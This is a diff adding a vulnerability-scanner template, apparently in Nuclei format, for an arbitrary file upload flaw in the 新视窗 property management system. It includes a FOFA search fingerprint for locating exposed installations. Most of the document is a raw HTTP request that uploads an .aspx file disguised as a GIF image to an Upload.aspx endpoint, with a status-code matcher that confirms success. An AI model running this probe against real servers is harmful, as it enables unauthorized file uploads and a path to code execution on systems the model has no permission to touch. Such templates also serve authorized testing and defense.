@@ -1,0 +1,68 @@
+id: poc-gp8pbs9pkcp8cisv
+info:
+  name: 新视窗新一代物业管理系统任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gp8pbs9pkcp8cisv'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: gp8pbs9pkcp8cisv
+    fofa: body="BPMSite/ClientSupport/OCXInstall.aspx"
+http:
+- raw:
+  - 'POST /OfficeManagement/RegisterManager/Upload.aspx HTTP/1.1
+
+
+    Cookie: JSESSIONID=FC2204F3698D2A07CDE9786055A071CB
+
+
+    Content-Type: multipart/form-data; boundary=00content0boundary00
+
+
+    Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+
+
+    Connection: close
+
+
+
+
+    --00content0boundary00
+
+
+    Content-Disposition: form-data; name="file"; filename="dudesite.aspx"
+
+
+    Content-Type: image/jpg
+
+
+
+
+    GIF89a
+
+
+    123
+
+
+    --00content0boundary00--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    Upload
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
